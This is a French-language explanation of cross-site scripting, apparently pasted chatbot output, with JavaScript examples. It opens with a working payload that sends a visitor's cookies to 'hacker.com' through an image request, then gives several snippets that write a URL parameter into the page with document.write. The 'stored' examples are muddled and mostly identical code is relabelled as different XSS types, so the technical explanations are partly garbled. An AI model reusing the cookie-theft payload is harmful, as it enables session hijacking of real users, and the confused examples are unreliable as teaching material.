Voici un exemple de code XSS (Cross-Site Scripting) qui peut être utilisé pour voler les cookies d'un utilisateur :

<script>
  var cookie = document.cookie;
  var url = "http://hacker.com/?cookie=" + cookie;
  var img = new Image();
  img.src = url;
</script>

Ce code crée une image avec l'URL d'un site malveillant qui inclut les cookies de l'utilisateur dans l'URL. Lorsque l'utilisateur visite la page, le script sera exécuté dans son navigateur et les cookies seront envoyés à l'adresse indiquée dans l'URL, permettant au pirate informatique de les récupérer.

### Voici d'autres exemples d'attaques XSS (Cross-Site Scripting) :

Un pirate informatique peut injecter du code JavaScript malveillant dans un formulaire de contact d'un site web, de sorte que lorsqu'un utilisateur remplit et soumet le formulaire, le script malveillant est exécuté dans son navigateur.

Un pirate informatique peut également utiliser une attaque XSS pour créer une fausse page de connexion sur un site web, de sorte que lorsqu'un utilisateur entre ses informations de connexion, elles sont en fait envoyées au pirate informatique au lieu d'être traitées par le site web légitime.

Une attaque XSS peut également être utilisée pour afficher des pop-ups publicitaires intempestifs sur un site web lorsqu'un utilisateur le visite, de sorte que le pirate informatique peut générer des revenus en affichant des publicités.

Un pirate informatique peut également utiliser une attaque XSS pour détourner les clics d'un utilisateur vers un site web malveillant, de sorte que lorsque l'utilisateur clique sur un lien sur un site web légitime, il est redirigé vers un site web malveillant au lieu de l'endroit où il voulait aller.

Enfin, un pirate informatique peut utiliser une attaque XSS pour collecter des informations sensibles sur les utilisateurs d'un site web, telles que leur nom d'utilisateur, leur mot de passe, leur adresse e-mail, etc. et les utiliser à des fins malveillantes.


### Voici une liste d'exemples d'attaques XSS (cross-site scripting) :

XSS persistant : Dans ce type d'attaque, l'attaquant injecte du code malveillant dans un site web ou une application web qui est enregistré dans la base de données. Lorsque d'autres utilisateurs visitent le site web ou l'application, le code malveillant est exécuté dans leur navigateur web.

XSS non persistant : Ce type d'attaque consiste à injecter du code malveillant dans un site web ou une application web qui n'est pas enregistré dans la base de données. Le code est exécuté dans le navigateur web des utilisateurs qui visitent le site web ou l'application tant que le code est encore actif.

XSS basé sur DOM : Ce type d'attaque consiste à injecter du code malveillant dans le modèle d'objet de document (DOM) d'un site web ou d'une application web. Le code est exécuté dans le navigateur web des utilisateurs qui visitent le site web ou l'application.

XSS stocké : Ce type d'attaque consiste à injecter du code malveillant dans un site web ou une application web qui est stocké sur le serveur. Lorsque d'autres utilisateurs visitent le site web ou l'application, le code malveillant est exécuté dans leur navigateur web.

XSS reflété : Dans ce type d'attaque, l'attaquant injecte du code malveillant dans un site web ou une application web via un lien malveillant qui est envoyé à la victime. Lorsque la victime clique sur le lien, le code malveillant est exécuté dans son navigateur web.

Voici un exemple de code d'une attaque XSS reflétée :

Copy code
<script>
  var url = new URL(window.location.href);
  var c = url.searchParams.get("c");
  document.write(c);
</script>
Dans cet exemple, l'attaquant peut envoyer un lien contenant un paramètre "c" qui contient du code malveillant. Lorsque la victime clique sur le lien, le code malveillant est exécuté dans son navigateur web.

Voici un exemple de code d'une attaque XSS stocké :

<script>
  var comment = "Hello, this is a malicious comment!";
  // Save the comment to the database
  saveComment(comment);
</script>
Dans cet exemple, l'attaquant injecte du code malveillant dans un formulaire de commentaire sur un site web. Lorsque l'administrateur du site web consulte les commentaires, le code malveillant est exécuté dans son navigateur web.

Voici des exemples de code pour les autres types d'attaques XSS :

XSS persistant :
Copy code
<script>
  var comment = "Hello, this is a malicious comment!";
  // Save the comment to the database
  saveComment(comment);
  
  // Load the comments from the database and display them on the page
  var comments = loadComments();
  for (var i = 0; i < comments.length; i++) {
    document.write(comments[i]);
  }
</script>
XSS non persistant :
Copy code
<script>
  // Parse the URL to get the "c" parameter
  var url = new URL(window.location.href);
  var c = url.searchParams.get("c");
  // Write the parameter to the page
  document.write(c);
</script>
XSS basé sur DOM :
Copy code
<script>
  // Get the URL of the page
  var url = window.location.href;
  // Parse the URL to get the "c" parameter
  var url = new URL(window.location.href);
  var c = url.searchParams.get("c");
  // Write the parameter to the page
  document.write(c);
</script>
XSS stocké :
Copy code
<script>
  // Load the comments from the database and display them on the page
  var comments = loadComments();
  for (var i = 0; i < comments.length; i++) {
    document.write(comments[i]);
  }
</script>
XSS reflété :
Copy code
<script>
  // Parse the URL to get the "c" parameter
  var url = new URL(window.location.href);
  var c = url.searchParams.get("c");
  // Write the parameter to the page
  document.write(c);
</script>
Dans ces exemples, l'attaquant injecte du code malveillant dans les différents éléments du site web ou de l'application web. Lorsque la victime visite le site web ou l'application, le code malveillant est exécuté dans son navigateur web.